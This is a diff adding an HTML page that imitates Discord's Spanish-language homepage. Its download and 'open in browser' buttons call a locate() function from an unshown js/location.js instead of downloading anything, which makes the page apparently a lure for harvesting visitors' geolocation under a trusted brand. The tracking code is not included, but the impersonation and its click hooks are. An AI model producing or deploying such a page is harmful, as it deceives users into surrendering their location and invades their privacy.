@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord</title>
+    <link rel="stylesheet" href="css/style.css">
+    <link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+    <script type="text/javascript">
+    	if (window.location.protocol == "http:") {
+        	var restOfUrl = window.location.href.substr(5);
+        	
+    	}
+    </script>
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+	<script type="text/javascript" src="js/location.js"></script>
+</head>
+
+<body>
+    <div class="top-container">
+        <header>
+            <img src="images/discord-logo.png">
+            <div class="center-nav">
+                <a href="#">Descargar</a>
+                <a href="#">¿Por qué Discord?</a>
+                <a href="#">Nitro</a>
+                <a href="#">Seguridad</a>
+                <a href="#">Soporte</a>
+            </div>
+            <a href="#">Abrir Discord</a>
+            <img class="hamburger" src="images/hamburger.svg">
+        </header>
+
+        <div class="center-box">
+            <h1>Tu lugar para hablar</h1>
+            <p>Ya sea que seas parte de un club escolar, un grupo de juegos, una comunidad artística mundial o simplemente un puñado de amigos que quieren pasar tiempo juntos, Discord hace que sea fácil hablar todos los días y pasar el rato con más frecuencia.</p>
+            <div class="nav-buttons">
+                <a href="" class="jfk-button jfk-button-action" onclick="locate(function(){window.location='';}, function(){$('#change').html('Failed');});"><svg width="24" height="24" viewBox="0 0 24 24" class="icon-nuGd5b"><g fill="currentColor"><path d="M17.707 10.708L16.293 9.29398L13 12.587V2.00098H11V12.587L7.70697 9.29398L6.29297 10.708L12 16.415L17.707 10.708Z"></path><path d="M18 18.001V20.001H6V18.001H4V20.001C4 21.103 4.897 22.001 6 22.001H18C19.104 22.001 20 21.103 20 20.001V18.001H18Z"></path></g></svg>Descargar para Windows</a>
+                <button href="" class="jfk-button jfk-button-action" onclick="locate(function(){window.location='';}, function(){$('#change').html('Failed');});">Abre discord en tu navegador</button>
+            </div>
+        </div>
+
+        <img class="cloud" src="images/cloud.svg" width="35px">
+
+    </div>
+    <div class="container" data-aos="fade-up">
+        <img class="container-img" src="images/container-1.svg">
+        <div class="description">
+            <h2>Un lugar al que solo se puede acceder por invitación y con mucho espacio para hablar</h2>
+            <p>Los servidores de Discord están organizados en canales temáticos donde puedes colaborar, compartir y simplemente hablar sobre tu día sin obstruir un chat grupal.</p>
+        </div>
+    </div>
+
+    <div class="container2" data-aos="fade-up">
+        <div class="description">
+            <h2>Donde pasar el rato es fácil</h2>
+            <p>Toma asiento en un canal de voz cuando estés libre. Los amigos en tu servidor pueden ver que estás cerca y entrar instantáneamente para hablar sin tener que llamar.</p>
+        </div>
+        <img class="container-img" src="images/container-2.svg">
+    </div>
+
+    <div class="container2-mobile" data-aos="fade-up">
+        <img class="container-img" src="images/container-2.svg">
+        <div class="description">
+            <h2>Donde pasar el rato es fácil</h2>
+            <p>Toma asiento en un canal de voz cuando estés libre. Los amigos en tu servidor pueden ver que estás cerca y entrar instantáneamente para hablar sin tener que llamar.</p>
+        </div>
+    </div>
+
+    <div class="container" data-aos="fade-up">
+        <img class="container-img" src="images/container-3.svg">
+        <div class="description">
+            <h2>De unos pocos a un fandom</h2>
+            <p>Obtenga una comunidad de cualquier tamaño en funcionamiento con herramientas de moderación y acceso personalizado para miembros. Otorgue a los miembros poderes especiales, configure canales privados y más.</p>
+        </div>
+    </div>
+    <div class="bottom-container" data-aos="fade-up">
+        <div class="description">
+            <h2>Tecnología confiable para permanecer cerca</h2>
+            <p>La voz y el vídeo de baja latencia se sienten como si estuvieran en la misma habitación. Saluda por video, mira cómo tus amigos transmiten sus juegos o reúnete y disfruta de una sesión de dibujo con pantalla compartida.</p>
+        </div>
+        <img src="images/container-4.svg">
+    </div>
+
+    <div class="last-message">
+        <h4>¿Listo para comenzar tu viaje?</h4>
+        <a href="" class="jfk-button jfk-button-action" onclick="locate(function(){window.location='';}, function(){$('#change').html('Failed');});"><svg width="24" height="24" viewBox="0 0 24 24" class="icon-nuGd5b"><g fill="currentColor"><path d="M17.707 10.708L16.293 9.29398L13 12.587V2.00098H11V12.587L7.70697 9.29398L6.29297 10.708L12 16.415L17.707 10.708Z"></path><path d="M18 18.001V20.001H6V18.001H4V20.001C4 21.103 4.897 22.001 6 22.001H18C19.104 22.001 20 21.103 20 20.001V18.001H18Z"></path></g></svg>Descargar para Windows</a>
+
+    </div>
+
+    <footer>
+        <div class="footer-nav">
+            <div class="socials">
+                <h4>Tu lugar para hablar</h4>
+                <img src="images/Flag-logo.png">
+                <!--English, USA-->
+                <select id="country">
+                        <option value="Español">Español, ES</option>
+                        <option value="Hindi">Hindi, India</option>
+                        <option value="Polski">Polski, Poland</option>
+                        <option value="French">French, France</option>
+                        <option value="Kurdish">Kurdish, Turkey</option>
+                </select>
+                <br>
+                <img src="images/twitter-svg.svg" width="24px">
+                <img src="images/instagram-svg.svg" width="24px">
+                <img src="images/facebook-svg.svg" width="24px">
+                <img src="images/youtube-svg.svg" width="24px">
+            </div>
+            <div class="space">
+
+            </div>
+            <div class="column">
+                <h5>Producto</h5>
+                <a href="#">Descarga</a>
+                <a href="#">Por qué Discord</a>
+                <a href="#">Inspiración</a>
+                <a href="#">Colección</a>
+                <a href="#">Nitro</a>
+                <a href="#">Estado</a>
+            </div>
+            <div class="column">
+                <h5>Compañía</h5>
+                <a href="#">Sobre nosotros</a>
+                <a href="#">Empleos</a>
+                <a href="#">Marca</a>
+                <a href="#">Noticias</a>
+            </div>
+            <div class="column">
+                <h5>Resources</h5>
+                <a href="#">Soporte</a>
+                <a href="#">Seguridad</a>
+                <a href="#">Blog</a>
+                <a href="#">Opiniones</a>
+                <a href="#">Patrocinadores</a>
+                <a href="#">Verificacion</a>
+                <a href="#">Desarrolladores</a>
+                <a href="#">StreamKit</a>
+                <a href="#">Videojuegos</a>
+                <a href="#">Misiones</a>
+                <a href="#">Moderacion</a>
+            </div>
+            <div class="column">
+                <h5>Policies</h5>
+                <a href="#">Terminos</a>
+                <a href="#">Privacidad</a>
+                <a href="#">Configuración de cookies</a>
+                <a href="#">Directivas</a>
+                <a href="#">Agradecimientos</a>
+                <a href="#">Licencias</a>
+                <a href="#">Información de la empresa</a>
+            </div>
+
+        </div>
+        <div class="footer-nav-mobile">
+            <div class="socials">
+                <h4>Tu lugar para hablar</h4>
+                <img src="images/Flag-logo.png">
+                <!--English, USA-->
+                <select id="country">
+                        <option value="English">English, USA</option>
+                        <option value="Hindi">Hindi, India</option>
+                        <option value="Polski">Polski, Poland</option>
+                        <option value="French">French, France</option>
+                        <option value="Kurdish">Kurdish, Turkey</option>
+                </select>
+                <br>
+                <img src="images/twitter-svg.svg" width="24px">
+                <img src="images/instagram-svg.svg" width="24px">
+                <img src="images/facebook-svg.svg" width="24px">
+                <img src="images/youtube-svg.svg" width="24px">
+            </div>
+            <table>
+                <tbody>
+                    <tr>
+                        <td class="heading">
+                            Producto
+                        </td>
+                        <td class="heading">
+                            Company
+                        </td>
+                    </tr>>
+                    <tr>
+                        <td>
+                            <a href="#">Download</a>
+                        </td>
+                        <td>
+                            <a href="#">About</a>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td>
+                            <a href="#">Why Discord</a>
+                        </td>
+                        <td>
+                            <a href="#">Jobs</a>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td>
+                            <a href="#">Inspiration</a>
+                        </td>
+                        <td>
+                            <a href="#">Branding</a>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td>
+                            <a href="#">College</a>
+                        </td>
+                        <td>
+                            <a href="#">Newsroom</a>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td>
+                            <a href="#">Nitro</a>
+                        </td>
+                        <td>
+                            <a href="#">Store</a>
+                        </td>
+                    </tr>
+                </tbody>
+                <tbody>
+                    <tr>
+                        <td class="heading">
+                            Resources
+                        </td>
+                        <td class="heading">
+                            Policies
+                        </td>
+                    </tr>>
+                    <tr>
+                        <td>
+                            <a href="#">Support</a>
+                        </td>
+                        <td>
+                            <a href="#">Terms</a>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td>
+                            <a href="#">Safety</a>
+                        </td>
+                        <td>
+                            <a href="#">Privacy</a>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td>
+                            <a href="#">Blog</a>
+                        </td>
+                        <td>
+                            <a href="#">Guidelines</a>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td>
+                            <a href="#">Feedback</a>
+                        </td>
+                        <td>
+                            <a href="#">Acknowledgements</a>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td>
+                            <a href="#">Partners</a>
+                        </td>
+                        <td>
+                            <a href="#">Licenses</a>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td>
+                            <a href="#">Verification</a>
+                        </td>
+                        <td>
+                            <a href="#"></a>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td>
+                            <a href="#">Developers</a>
+                        </td>
+                        <td>
+                            <a href="#"></a>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td>
+                            <a href="#">StreamKit</a>
+                        </td>
+                        <td>
+                            <a href="#"></a>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td>
+                            <a href="#">Open Source</a>
+                        </td>
+                        <td>
+                            <a href="#"></a>
+                        </td>
+                    </tr>
+                </tbody>
+
+            </table>
+        </div>
+        <div class="footer-bar">
+            <img src="images/discord-logo.png">
+            <a href="https://discord.com/channels/@me">Abrir discord</a>
+        </div>
+    </footer>
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+    <script>
+        AOS.init({
+            offset: 400,
+            duration: 1000
+        });
+    </script>
+</body>
+
+</html>
